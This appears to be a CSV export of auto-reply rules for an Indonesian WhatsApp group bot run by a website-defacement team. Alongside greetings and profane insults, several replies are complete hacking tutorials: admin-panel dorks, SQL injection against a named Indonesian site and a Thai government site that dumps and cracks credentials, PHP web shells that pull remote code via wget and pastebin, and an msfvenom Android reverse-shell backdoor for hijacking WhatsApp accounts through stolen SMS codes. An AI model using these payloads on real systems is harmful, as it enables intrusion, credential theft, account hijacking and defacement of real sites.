"received_message","pattern_matching","reply_message","multiple_replies","multiple_reply_delay","multiple_reply_delay_max","recipients","contacts","ignored_contacts","reply_delay","reply_delay_max","specific_times","monday","tuesday","wednesday","thursday","friday","saturday","sunday","pause_type","pause_value","disabled"
"dork bypass admin","none","DORK BYPASS ADMIN SAKTI GAN :v inurl:/administrator/login.php inurl:/admin/index.php intext:username inurl:/administrator/login.php intext:username inurl:/admin/main.php intext:username inurl:/admin/login.html intext:login inurl:/administrator/index.php intext:login inurl:/adminweb/ intext:login.php ""inurl:admin.php"" ""inurl:admin/login.php"" ""inurl:adminlogin.php"" ""inurl:adminhome.php"" ""inurl:admin_login.php"" ""inurl:administratorlogin.php"" ""inurl:/Manager/index.php ""inurl:login/administrator.php"" ""inurl:administrator_login.php ""inurl:admin/addproduct.asp"" ""inurl:admin/user.asp"" ""inurl:admin/ addpage.php"" ""inurl:admin/ gallery.asp"" ""inurl:admin/image.asp"" ""inurl:admin/adminuser.asp"" ""inurl:admin/productadd.asp"" ""inurl:admin/addadmin.asp"" ""inurl:admin/add_admin.asp"" ""inurl:admin/add_admin.php"" ""inurl:admin/addnews.asp"" ""inurl:admin/addpost"" ""inurl:admin/addforum.???"" ""inurl:admin/addgame.???"" ""inurl:admin/addblog.????"" ""inurl:admin/admin_detail.php"" ""inurl:admin/admin_area.php"" ""inurl:admin/product_add.php"" ""inurl:admin/additem.php"" ""inurl:admin/addstore.php"" ""inurl:admin/add_Products.???"" ""inurl:admin/showbook.???"" ""inurl:admin/selectitem.???"" ""allinurl:admin/addfile.???"" ""inurl:admin/addarticle.asp"" ""inurl:admin/addfile.asp"" ""inurl:admin/upload.php"" ""inurl:admin/upload.asp"" ""inurl:admin/addstory.php"" ""inurl:admin/addshow.php"" ""inurl:admin/addmember.asp"" ""inurl:admin/addinfo.asp"" ""inurl:admin/addcat.asp"" ""inurl:admin/cp.asp"" ""inurl:admin/ productshow.asp"" ""inurl:admin/ addjob.asp"" ""inurl:admin/addjob.???"" ""inurl:admin/addpic.???"" ""inurl:admin/viewproduct.???"" ""inurl:admin/addaccount.php"" ""inurl:admin/manage.php"" ""inurl:admin/addcontact.???"" ""inurl:admin/viewmanager.???"" ""inurl:admin/addschool.???"" ""inurl:admin/addproject.???"" ""inurl:admin/addsale.???"" ""inurl:admin/addcompany.???"" ""inurl:admin/payment.???"" ""inurl:user/emp.???"" ""inurl:admin/ addmovie.???"" ""inurl:admin/ addpassword.???"" ""inurl:admin/ addemployee.???"" ""inurl:admin/ addcat.???"" ""inurl:admin/admin.???"" ""inurl:admin/admincp.???"" ""inurl:admin/settings.???"" ""inurl:admin/addstate.???"" ""inurl:admin/addcountry.???"" ""inurl:admin/addmedia.???"" ""inurl:admin/addcode.???"" ""inurl:admin/addlinks.???"" ""inurl:admin/addcity.???"" ""inurl:admin/login.asp"" ""inurl:adminlogin.asp"" ""inurl:adminhome.asp"" ""inurl:admin_login.asp"" ""inurl:administratorlogin.asp"" ""inurl:login/administrator.asp"" ""inurl:administrator_login.asp inurl:/admin/index.php?id=? inurl:/admin/index.php?r=site/login Dork bypas admin 3 ""inurl:admin/addproduct.asp"" ""inurl:admin/user.asp"" ""inurl:admin/addpage.php"" ""inurl:admin/gallery.asp"" ""inurl:admin/image.asp"" ""inurl:admin/adminuser.asp"" ""inurl:admin/productadd.asp"" ""inurl:admin/addadmin.asp"" ""inurl:admin/add_admin.asp"" ""inurl:admin/add_admin.php"" ""inurl:admin/addnews.asp"" ""inurl:admin/addpost"" inurl""inurl:admin/addforum.???"" ""inurl:admin/addgame.???"" ""inurl:admin/addblog.????"" ""inurl:admin/admin_detail.php"" ""inurl:admin/admin_area.php"" ""inurl:admin/product_add.php"" ""inurl:admin/additem.php"" ""inurl:admin/addstore.php"" ""inurl:admin/add_Products.???"" ""inurl:admin/showbook.???"" ""inurl:admin/selectitem.???"" ""allinurl:admin/addfile.???"" ""inurl:admin/addarticle.asp"" ""inurl:admin/addfile.asp"" ""inurl:admin/upload.php"" ""inurl:admin/upload.asp"" ""inurl:admin/addstory.php"" ""inurl:admin/addshow.php"" ""inurl:admin/addmember.asp"" ""inurl:admin/addinfo.asp"" ""inurl:admin/addcat.asp"" ""inurl:admin/cp.asp"" ""inurl:admin/productshow.asp"" ""inurl:admin/addjob.asp"" ""inurl:admin/addjob.???"" ""inurl:admin/addpic.???"" ""inurl:admin/viewproduct.???"" ""inurl:admin/addaccount.php"" ""inurl:admin/manage.php"" ""inurl:admin/addcontact.???"" ""inurl:admin/viewmanager.???"" ""inurl:admin/addschool.???"" ""inurl:admin/addproject.???"" ""inurl:admin/addsale.???"" ""inurl:admin/addcompany.???"" ""inurl:admin/payment.???"" ""inurl:user/emp.???"" ""inurl:admin/addmovie.???"" ""inurl:admin/addpassword.???"" ""inurl:admin/addemployee.???"" ""inurl:admin/addcat.???"" ""inurl:admin/admin.???"" ""inurl:admin/admincp.???"" ""inurl:admin/settings.???"" ""inurl:admin/addstate.???"" ""inurl:admin/addcountry.???"" ""inurl:admin/addmedia.???"" ""inurl:admin/addcode.???"" ""inurl:admin/addlinks.???"" ""inurl:admin/addcity.???""","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"assalamualaikum","none","Waalakumsallam","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"menu","none","maintenance","single","","","g","","","","","0","","","","","","","","seconds","0","1"
"sql balitbang","none","cara\n devace web sekolah menggunakan metode Balitbang.. kalian yg punya dendam, benci atau apalah ke sekolah kalian mngkin bisa bisa pke cara ini:V"".. balitbang sendiri ada bnyk ada yg register 3.5.3.. tpi kalaw gw sih pke tools punya nya master gw afrizal:V"".. lngsng aja tutorialnya :\n\n\n1. Termux (download diplaystore)\n\n2. Sc&Shell Backdoor\n\n3. Dork : \n\n>intext:""Setup by Website Sekolah Gratis."" Ulangan Site:sch.id\n\ninurl:/member/daftar.php\n>intext:""Setup by cmssekolahku."" cbt site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" rudi site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" guru bahasa site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" firman site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" kenaikan kelas Site:sch.id\n(Kembangin ea biar dpet bnyk)\n\n4. Toolsnya :\nhttps://github.com/Afrizall/balitbang-sqli-post-data/blob/master/balitbang.php\n\n5. Exploit ; http://web.nya/member/listmemberall.php\n\nLangkah awal dorking digoogle kek biasanyaa .. Btw gw sih suka deface web pemerintah ketimbang web sekolah:V""..\n\n\nPilih salah satu target web sekolah yg mau dideface.. kemudian masukan exploitnya /listmemberall.php kalaw vuln blank putih..\n\n\n\n\nKalaw sudah nemu target buka termux dan install dulu toolsnya.. caranya? \n\n$git clone https//github.com/Afrizall/balitbang-sqli-post-data/blob/master/balitbang.php \n\n\nKemudian \n\n$cd balitbang-sqli-post-data\n\nLast\n$php balitbang.php targetkalian\n\n\n\n[+] Data 1 [+]\n\n[+] Username : admin\n\n[+] Password : 5bg848383c1c6c7c4b3c0\n\n[+] End Data [+]\n\n\n[+] Data 2 [+]\n\n[+] Username : gafar\n\n[+] Password : 5bg848383b3bbb9c0b3c5\n\n[+] End Data [+]\n\n\nLah done kan.. terakhir tingggal kita hash passwordnya yg data1.. hashnya private ea bang..","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bot tolol","similar","Kau yang tolol anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bot kontol","similar","Kau yang kontol anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bot anjeng","similar","Kau yang anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"into out file","none","Hy Sobat ^_^ Udah lama nih ga nge-post lagi :V\n\n\nBerhubung Kemaren ada temen yang rewel banget minta dibuatin Tutorial ini maka disini ane akan menunjukkan bagaimana cara mengunggah shell pada suatu webiste dengan SQL Injection tanpa harus menjadi admin, langsung saja berikut ini adalah langkah - langkahnya :\n\n\n\n1) Kita cari target yang vuln SQLi dulu, di sini saya sudah mendapatkan 1 target yaitu http://www.vaksindo.co.id/ test target dengan menambahkan tanda ' pada parameter SQL nya ..\n\n\n\n\n2) jika error maka akan muncul tulisan ""Error My SQL bla bla.."" atau sebagian konten ada yang hilang seperti dalam contoh ini ..\n\n\n\n\n\n3) sekarang kita lakukan order by untuk menemukan jumlah table. \n\nhttp://www.vaksindo.co.id/vaksindo/views.php?page=1&id=1%27+order+by+1--+&lang=id&p=produk-kami\nhttp://www.vaksindo.co.id/vaksindo/views.php?page=1&id=1%27+order+by+2--+&lang=id&p=produk-kami\nhttp://www.vaksindo.co.id/vaksindo/views.php?page=1&id=1%27+order+by+3--+&lang=id&p=produk-kami\nlakukan hingga error ( Tulisan Hilang ) Kembali\n\n\n4) ternyata di sini trdapat 19 table, selanjutnya kita union+select untuk menemukan table yang bisa di injeksi\n\n\n5) Owh.. ternyata Aksi kita di blok oleh server, kita bisa membypass nya dengan mengganti union menjadi /*!12345union*/\n\n\n6) yaaappss udh ga di blok :D tapi mana? nomer tablenya kok ga muncul? o.O\nhhaha jangan kuatir, untuk memunculkannya tambahkan +and+0 di belakang ID parameter.\n\n\n\n7) nah tuh kita udh dapet nomer nya yaitu 3 , nomer ini lah yang nanti kita gunakan untuk mengeksekusi perintah"" SQLi, sekarang kita cek dulu file_priv nya untuk mengetahui apakah kita bisa mengupload shell atau tidak menggunakan SQLi. Ganti angka 3 tadi dengan file_priv dan tambahkan +from+mysql.user sebelum tanda --+\n\n\n8) yaak kita mendapatkan jawaban Y yang berarti kita bisa mengupload shell melalui SQL Injection :D selanjutnya kita mencoba untuk me-load file /etc/passwd yang ada di server dengan perintah load_file('/etc/passwd') > Letakkan pada angka 3 tadi dan jangan lupa hapus\nstring ""+from+mysql.user"" terlebih dahulu\n\n\nkita dapat :\nroot:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin named:x:25:25:Named:/var/named:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rtkit:x:499:497:RealtimeKit:/proc:/sbin/nologin avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin abrt:x:173:173::/etc/abrt:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin gdm:x:42:42::/var/lib/gdm:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin saslauth:x:498:76:""Saslauthd user"":/var/empty/saslauth:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin pulse:x:497:496:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin dovecot:x:97:97:Dovecot IMAP server:/usr/libexec/dovecot:/sbin/nologin dovenull:x:496:493:Dovecot's unauthorized user:/usr/libexec/dovecot:/sbin/nologin squid:x:23:23::/var/spool/squid:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin admin:x:500:500:administrator:/home/admin:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash ayu:x:502:503::/home/ayu:/bin/bash vaksindo:x:504:505::/var/www/html/vaksindo:/sbin/nologin japfa4kids:x:505:506::/var/www/html/japfa4kids:/sbin/nologin Administrator:x:506:507::/var/www/html/:/sbin/nologin admincorporate:x:507:508::/var/www/html/corporate/:/bin/bash admincatalog:x:508:509::/var/www/html/ecatalog/:/bin/bash\n\n9) di file ini kita bisa mencari folder"" yang sekiranya bisa kita jadikan tempat memasang shell kita. di sini saya menemukan /var/www/html/vaksindo sebagai folder tempat penyimpanan file"" website ini, langkah ini lah yang paling sulit ketika SQLi Into Out File.\n\n\n10) Langkah selanjutnya yakni memasang shell command sederhana yang berisi <?include($_GET[""cmd']);?> namun harus diconvert dahulu menjadi bentuk hex 0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e\ntambahkan hex tersebut pada angka 3 tadi dan tmbahkan string ini sebelum --+\n+INTO+OUTFILE+'directory_web_yang_writable/namashellente.php\n\ncontoh :\n+INTO+OUTFILE+'/var/www/html/vaksindo/foto_berita/pescyte.php'\n\n\n11) Sekarang kita buka shell kita.\n\n\n12) loh kok shellnya cuman angka gitu? o.O hhehee santai, namanya juga shell sederhana, jadi fungsinya di umpetin :v cara memasang shellnya yaitu tambahkan perintah berikut setelah meong.php:\n?cmd=wget alamatshell.txt\ncontoh : ?cmd=wget http://ppsd-files.pe.hu/v2.txt\n\n\n\n13) lalu dilanjutkan dengan perintah :\n?cmd=mv v2.txt anon.php\n\n\n\n\n14) Langkah terakhir, kita buka shell kita yang asli.\n\n\nBinggoooo :D kita sudah berhasil mengupload shell kita :D ","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"pe","none","Lu Islam kagak !","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"rey","none","Ada perlu kalau gak ada skip!","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"sql base64","none","Live target: http://dwf72.go.th/\n\n1. Pertama kalian cari dulu parameter webnya, buat inject\n\nsite:dwf72.go.th inurl:php?id=\n\n2. Buat sql base64 ini kalian butuh apk or tools online buat encode decode base64 nya\n\nhttps://play.google.com/store/apps/details?id=duy.com.text_converter\n\n3. Kalian pilih choose method, lalu klik base64\n\nLalu kalian masukan angka parameternya 184\n\nMaka akan keluar encodenya MTg0==\n\n4. Pada angka 184 kalian kasi '\n\nJadi \n184'\n\nSetelah itu kalian salin hasil encodenya\n\nMTg0Jw==\n\nLalu paste diparam seperti ini\n\nhttp://dwf72.go.th/news.php?id=MTg0Jw==\n\nMaka akan keluar error/vuln\n\n5. Kalian lakukan order by seperti saat sql-i biasa\nTapi encode dalam bentuk base64\n\n184 order by 1 -- -\n\nLalu salin hasil encodenya ke parameternya, sampai error ya\n\n(order by 27) normal\nhttp://dwf72.go.th/news.php?id=MTg0IG9yZGVyIGJ5IDI3IC0tIC0=\n\n(order by 28) error\nhttp://dwf72.go.th/news.php?id=MTg0IG9yZGVyIGJ5IDI4IC0tIC0=\n\nartinya kita cuma menggunakan 1 - 27 saja\n\n6. Kita encode lagi:\n-184 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 -- -\n\nHasil:\nLTE4NCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMsMjQsMjUsMjYsMjcgLS0gLQ==\n\nLalu masukan ks parameter webnya lagi:\n\nhttp://dwf72.go.th/news.php?id=LTE4NCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMsMjQsMjUsMjYsMjcgLS0gLQ==\n\nDan keluar angka togelnya\n\n7. Lanjut ke tahap dump\n\nKita encode lagi:\n-184 union select 1,2,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 -- -\n\nHasil:\nLTE4NCB1bmlvbiBzZWxlY3QgMSwyLG1ha2Vfc2V0KDYsQDo9MHgwYSwoc2VsZWN0KDEpZnJvbShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyl3aGVyZUA6PW1ha2Vfc2V0KDUxMSxALDB4M2M2YzY5M2UsdGFibGVfbmFtZSxjb2x1bW5fbmFtZSkpLEApLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDE5LDIwLDIxLDIyLDIzLDI0LDI1LDI2LDI3IC0tIC0=\n\nLalu kita masukan lagi ke parameternya:\nhttp://dwf72.go.th/news.php?id=LTE4NCB1bmlvbiBzZWxlY3QgMSwyLG1ha2Vfc2V0KDYsQDo9MHgwYSwoc2VsZWN0KDEpZnJvbShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyl3aGVyZUA6PW1ha2Vfc2V0KDUxMSxALDB4M2M2YzY5M2UsdGFibGVfbmFtZSxjb2x1bW5fbmFtZSkpLEApLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDE5LDIwLDIxLDIyLDIzLDI0LDI1LDI2LDI3IC0tIC0=\n\nDan akan muncul tablenya\n\n8. Selanjutnya kita scroll kebawah lalu cari table username & password\n\n9. Lalu kita dump, tapi jangan lupa encode dulu\n\n-184 union select 1,2,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(admin)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,0x203a3a20,password,0x3c62723e))))x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 -- -\n\nHasil:\nLTE4NCB1bmlvbiBzZWxlY3QgMSwyLChTRUxFQ1QoQHgpRlJPTShTRUxFQ1QoQHg6PTB4MDApLChTRUxFQ1QoQHgpRlJPTShhZG1pbilXSEVSRShAeClJTihAeDo9Q09OQ0FUKDB4MjAsQHgsdXNlcm5hbWUsMHgyMDNhM2EyMCxwYXNzd29yZCwweDNjNjI3MjNlKSkpKXgpLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDE5LDIwLDIxLDIyLDIzLDI0LDI1LDI2LDI3IC0tIC0=\n\nLink:\n\nhttp://dwf72.go.th/news.php?id=LTE4NCB1bmlvbiBzZWxlY3QgMSwyLChTRUxFQ1QoQHgpRlJPTShTRUxFQ1QoQHg6PTB4MDApLChTRUxFQ1QoQHgpRlJPTShhZG1pbilXSEVSRShAeClJTihAeDo9Q09OQ0FUKDB4MjAsQHgsdXNlcm5hbWUsMHgyMDNhM2EyMCxwYXNzd29yZCwweDNjNjI3MjNlKSkpKXgpLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDE5LDIwLDIxLDIyLDIzLDI0LDI1LDI2LDI3IC0tIC0=\n\nDan disini maka akan terlihat username passwordnya\n\n10. Lalu kita ambil paling atas\n\nsirinthip :: d01e270f53588fa9dcecd95968fba56374fc85ab\n\nUntuk \nuser : sirinthip\npassword : hash dulu \n\nKita hash\nd01e270f53588fa9dcecd95968fba56374fc85ab\n\nDisini:\nhttps://hashes.com/en/decrypt/hash\n\n11. Lalu kalian salin hasilnya:\nd01e270f53588fa9dcecd95968fba56374fc85ab:puypam\n\nJadi\n\nuser : sirinthip\npassword : puypam\n\n12. Lalu kita cari adlognya dulu\n\nhttp://dwf72.go.th/login\n\nIni adlognya\n\n13. Dan kalian tinggal Login\n\nJika sudah maka akan tampil dasboard admin","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"peringatan","similar","Kalau Rey gak aktif bot pun gak aktif juga harap bisa di maklumi","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"jangan gitu bot","none","Iya maaf","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"telah bergabung menggunakan tautan undangan grup ini","normal","Ketik ""menu"" untuk menampilkan bot grup<#>Semoga betah yang baru masuk grup ^_^","all","","","b","","","","","0","","","","","","","","seconds","0","0"
"kenapa down","none","Gara"" di spam sama member anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"sadap wa","similar","Cara menyadap Whatsapp memakai TERMUX\n\nHello bro, jumpa lagi di bersama omheker. Kali ini omheker akanmembagikan tutorial Cara menyadap Whatsapp memakai TERMUX no root. Jadi postingan ini akan membahas cara yang bisa digunakan untuk melakukan sadap whatsap menggunakan termux.\n\nBanyak aplikasi cara menyadap HP di internet tetapi Pada kesempatan kali ini omheker akan menggunakan Tool Metasploit yang ada pada TERMUX. Tool ini bisa kita manfaatkan untuk mendapatkan remote akses android target.\n\n\nJadi secara singkat, yang akan kami bagikan pada postingan ini adalah menginstal tool Metasploit di termux dan melakukan sadap wa menggunakan Metasploit. Berikut tutorial lengkap nya.\n\nSadap wa menggunakan Metasploit di Termux\n\nBagi yang belum punya aplikasi termux silahkan download dulu diplaystore untuk versi lama. Dan untuk versi terbarunya bisa kalian download termux versi lama \n\n\noke Langsung saja ke tutorialnya. Silahkan ikuti langkah-langkah berikut ini:\n\nLangkah 1: install Metasploit framework di Termux\n\nCara install Metasploit sangat mudah. tetapi size ukuran dari file Metasploit lumayan cukup besar yaitu sekitar 560mb. Sehingga kalian harus siapkan ruang penyimpanan dan kuota yang banyak.\n\n\nUntuk melakukan instalasi Metasploit framework anda bisa menggunakan command perintah berikut di aplikasi termux.\n\n apt update && apt upgrade\n\n pkg install unstable-repo\n\n pkg install metasploit\n\n\nSetelah tool Metasploit berhasil diinstal. Silahkan lanjutkan ke langkah 2.\n\nLangkah 2: MemBuat aplikasi menyadap ( membuat backdoor )\n\nDan Untuk membuat backdoor atau aplikasi sadap whatsapp anda harus menjalankan tool Metasploit nya. Gunakan command perintah berikut ini.\n\n msfconsole\n\nTunggu sampai tampilan nya berubah seperti gambar dibawah ini.\n\n\n\n\n\nSelanjutnya masukkan command berikut dan perhatian penjelasan nya agar tidak terjadi error.\n\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.101  LPORT=8080 -o /sdcard/tracker.apk\n\n# LHOST adalah IP address kalian. dan untuk Cara mengecek ip address masuk saja di setting / pengaturan lalu kemdian anda pilih tentang ponsel dan cari lagi menu status.\n\n\n\n\n\nJika android kalian tidak support, Silahakan pelajari trik lainya di halaman cara cek ip address.\n\n# LPORT kalian isi saja 8080\n\n# /sdcard/tracker.apk adalah tempat simpan dan nama file (backdoor). Kalian bisa ganti nama file sesuai keinginan. Tapi untuk tempat simpan nya sebaiknya tetap.\n\n\n\nTunggu sampai proses pembuatan aplikasi backdoor nya selesai. Biasanya memakan waktu 3-5 menit.\n\nSetelah semuanya selesai, Langkah selanjutnya anda pergi ke file manager kemudan cari file/aplikasi backdoor sesuai nama yang kalian berikan tadi. lalu kirimkan aplikasi tersebut ke target sadap wa kalian.\n\n\n\n\n\nLangkah 3: Proses penyadapan\n\nSetelah aplikasi backdoor nya dikirimkan. Pastikan korban juga harus menginstal aplikasi tersebut.\n\nLangkah Selanjutnya anda scan/cek apakah aplikasi sudah di install apa belum dengan menggunakan command berikut:\n\n. use multi/handler\n. set payload android/meterpreter/reverse_tcp\n. set lhost 192.168.1.101\n. set lport 4444\n. exploit\n\nMaka hasilnya akan seperti gambar dibawah ini.\n\n\n\n\n\nSetelah itu kalian Tunggu sampai ketika aplikasi backdoor terhubung dengan IP address kamu. Apabila pada tahap ini berlangsung sangat lama. Suruh korban untuk mengklik aplikasi yang sudah diinstall tadi.\n\nDan jika hasilnya sudah menunjukkan seperti gambar diatas. Kita ketikan saja\n\ndump_sms\n\nMaka semua pesan masuk korban akan bisa terbaca oleh kita. Dengan demikian untuk mendapatkan kode verifikasi dari whatsapp sangat lah mudah.\n\nHal terakhir kita hanya perlu melakukan pendaftaran ulang whatsapp menggunakan nomor korban. Dan pada saat harus memasukkan kode konfirmasi kita tinggal ulangi saja semua langkah 3: proses penyadapan\n\nUntuk lebih jelasnya, simak saja video tutorialnya dibawah ini:","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"push mirror","similar","Bantu push Napa anjeng kagak kesian apa sama team gua :(\n\nhttps://defacer.id/archive/team/grayhat-tersakiti-team","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"devace rce","similar","DEFACE POC RCE UPLOAD SHELL TERBARU!!\n\n\nAssalamualaikum wr wb.\n\n\n\nYo wassap gaes :V\nMumpung ada kesempatan nge blog di web team wkwkwk btw sibuk w anjg:( .\nKali ini gw SwamGans(GilangKun) mau kasih tutorial Deface Poc RCE !.\n\nSebenernya sih itu method dah lama ya anjg tapi gw coba tadi karna baca² juga sih di blog temen + dari gogel ternyata masih banyak web yang pulen(vuln) yang ezzz sangat buat di up shell + tebas peler nya xD\n\nUdah ya anjg gk usah banyak bacod:)\nSiapin dulu alat tempur nya xD\n\n-Termux\n-Dork Presh\n-Rokok\n-Face Gans\n-Kuota anjg jan lupa !\n\nOk gan kalo dah siap semua langsung kita ekse aja😎\n\nPertama kita dorking dulu gan di gogel kalo perlu  di deepweb anjg biar pro👊😎\n\nDork:\n    ~ inurl:/brandUrl=http://\n    ~ inurl:/signin.php?ret=http\n    ~ +""Public"" +""My Conferences"" +""Personal Library"" +""My Profile"" +19.49.5200.0\n\nMasukin dork di atas ke gogel :D\nGk paham? Tolol babi liat gambar di bawah anjg.\n\n\n\nUdah paham kan anjg?\n\nNah kalo dah paham tinggal lu cari web vuln nya xD\nCaranya? Ezzz banget dong pastinya :*\nKita install dulu tools rce nya.\nBuka termux lu asw kalo ga punya donlod sendiri jan manja ! W hek modar lu anjg.\n\nKetik command nya :\n$ pkg update && upgrade\n$ pkg install python\n$ pkg install wget\n$ pkg install bash\n$ git clone https://github.com/GarudaTersakti72/RCE\n$ ls\n$ cd RCE\n$ sh install.sh\n\nUdah ? Nah kalo udah cara cek web vuln nya kek gini :\n\nKetik : python Rce.py http://sitetarget.com\n\n\n\n\n\nPaham?.\nNah sekarang cara biar tau web itu pulen atau ga gimana? Ezzz kalo udah lu klik enter bakalan ada tulisan pulen/tidak pulen kok xD\nKek gini nih kalo pulen.\n\nTinggal kita up shell deh xD\n\nCaranya? Ketik :\n\n$ echo '<?php eval(""?>"".file_get_contents(""https://pastebin.com/raw/CurQrH1a"")); ?>' > sel.php\n\nNah kalo bisa ke upload shell nya kek gini nih liat gambar anjg jan liat bokep.\n\n\nBakalan ada tulisan No Output.\n\nCara akses nya? Ezz sangatz http://sitetarget.com/scripts/namashellu.php\n\n\nJederrr memexxxx ke upload kan? XD\n\nTerserah mau lu tebas index atau ngga :)","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"ompem ght","similar","https://chat.whatsapp.com/EFDaJ4xmtPc2IW1JRyQE0O\n\n*Assalamualaikum G.H.T open member*\n\n• DEFACER\n- devace 3 poc\n- 4 miror\n\n• BUG HUNTER\n-SQLI\n-XSS\n\n• CTF \n- forensic\n- cryptography\n- web\n\n*(Pilih salah satu)*\n\n\nMinat?\nHUB :\n\n*DEFACER*\nREY \nWa.me/6289513286355\n\n*CTF*\nStephen\nWa.me/62088233973151\n\n*BUG HUNTER*\nMr.Xploit 13\nWa.me/6281296227727\n\n#izin share","single","","","b","","","","","0","","","","","","","","seconds","0","0"
